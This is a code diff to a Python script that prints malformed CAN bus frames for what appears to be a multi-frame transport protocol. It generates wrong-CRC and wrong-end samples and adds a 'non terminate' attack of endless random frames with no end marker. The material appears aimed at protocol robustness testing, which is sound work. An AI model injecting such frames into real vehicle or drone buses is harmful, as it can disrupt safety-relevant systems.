@@ -1,6 +1,6 @@
 class CAN:
-    def build(interface, can_id, payload, tail_byte):
-        return f'{interface}  {can_id}   [{ len(payload.split(" ")) + 1 }]  {payload} {tail_byte}'
+    def build(interface, can_id, payload):
+        return f'{interface}  {can_id}   [{ len(payload.split(" ")) }]  {payload}'
 
 
 class CAN_ID:
@@ -9,9 +9,12 @@ class CAN_ID:
 
 
 class CAN_PAYLOAD:
+    def tail(s, e, t, id):
+        return f' {(s << 7) + (e << 6) + (t << 5) + id:02X}'
 
-    def build_tail(s, e, t, id):
-        return f'{(s << 7) + (e << 6) + (t << 5) + id:02X}'
+    def random():
+        import os
+        return ' '.join([ f'{i:02X}' for i in os.urandom(7) ])
 
 
 class attack:
@@ -29,8 +32,8 @@ class attack:
             print(CAN.build(
                     'can0', 
                     10015501, 
-                    f'{CRC} {" ".join(payload)}', 
-                    CAN_PAYLOAD.build_tail(
+                    f'{CRC} {" ".join(payload)}' +
+                    CAN_PAYLOAD.tail(
                         transfer_start, 
                         transfer_end, 
                         toggle, 
@@ -42,8 +45,8 @@ class attack:
             print(CAN.build(
                     'can0', 
                     10015501, 
-                    f'{CRC} {" ".join(payload[ : 5 ])}', 
-                    CAN_PAYLOAD.build_tail(
+                    f'{CRC} {" ".join(payload[ : 5 ])}' +
+                    CAN_PAYLOAD.tail(
                         transfer_start, 
                         transfer_end, 
                         toggle, 
@@ -59,8 +62,8 @@ class attack:
                 print(CAN.build(
                         'can0',
                         10015501,
-                        " ".join(payload[ : 7 ]), 
-                        CAN_PAYLOAD.build_tail(
+                        " ".join(payload[ : 7 ]) + 
+                        CAN_PAYLOAD.tail(
                             transfer_start, 
                             transfer_end, 
                             toggle, 
@@ -76,8 +79,8 @@ class attack:
             print(CAN.build(
                 'can0', 
                 10015501, 
-                " ".join(payload), 
-                CAN_PAYLOAD.build_tail(
+                " ".join(payload) + 
+                CAN_PAYLOAD.tail(
                     transfer_start, 
                     transfer_end, 
                     toggle, 
@@ -117,8 +120,8 @@ class attack:
         print(CAN.build(
                 'can0', 
                 10015501, 
-                f'{" ".join(payload)}', 
-                CAN_PAYLOAD.build_tail(
+                f'{" ".join(payload)}' + 
+                CAN_PAYLOAD.tail(
                     transfer_start, 
                     transfer_end, 
                     toggle, 
@@ -126,6 +129,8 @@ class attack:
                     )
                 )
             )
+
+        print()
 
     def wrong_END_test(self):
         print("''' wrong end attack sample input '''")
@@ -138,10 +143,51 @@ class attack:
         self.wrong_END('B1 B2 B3 B4 B5 B6')
         self.wrong_END('B1 B2 B3 B4 B5 B6 B7')
 
+    # send multiframe message with open end
+    def nonTERMINATE(counter = -1):
+        print("''' non terminate attack '''")
+
+        transfer_start  = 0b1
+        transfer_end    = 0b0
+        toggle          = 0b0
+        transfer_ID     = 0b00000
+
+        print(CAN.build(
+                'can0', 
+                10015501, 
+                CAN_PAYLOAD.random() +
+                CAN_PAYLOAD.tail(
+                    transfer_start, 
+                    transfer_end, 
+                    toggle, 
+                    transfer_ID
+                    )
+                )
+            )
+
+        transfer_start  = 0b0
+        while counter:
+            toggle ^= 0b1
+            print(CAN.build(
+                    'can0',
+                    10015501,
+                    CAN_PAYLOAD.random() + 
+                    CAN_PAYLOAD.tail(
+                        transfer_start, 
+                        transfer_end, 
+                        toggle, 
+                        transfer_ID
+                        )
+                    )
+                )
+            if counter != -1: counter -= 1
 
 def main():
     attack().wrong_CRC_test()
     attack().wrong_END_test()
+
+    # attack.nonTERMINATE()
+    attack.nonTERMINATE(10)
 
 
 if __name__ == "__main__":
